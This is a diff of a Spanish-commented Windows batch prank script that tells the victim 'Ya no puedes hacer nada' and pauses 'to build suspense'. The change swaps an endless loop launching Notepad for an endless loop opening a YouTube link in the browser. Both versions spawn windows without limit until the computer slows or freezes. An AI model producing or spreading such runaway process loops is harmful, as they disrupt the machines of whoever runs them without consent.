@@ -11,11 +11,8 @@ echo Ya no puedes hacer nada
 :: Esperar 3 segundos para generar suspenso
 timeout /t 3 /nobreak >nul
 
-start https://www.youtube.com/watch?v=8kQZHYbZkLs
-
-@ECHO off
 :top
-START %SystemRoot%\system32\notepad.exe
+start https://www.youtube.com/watch?v=8kQZHYbZkLs
 GOTO top
 
 :: Terminar el script
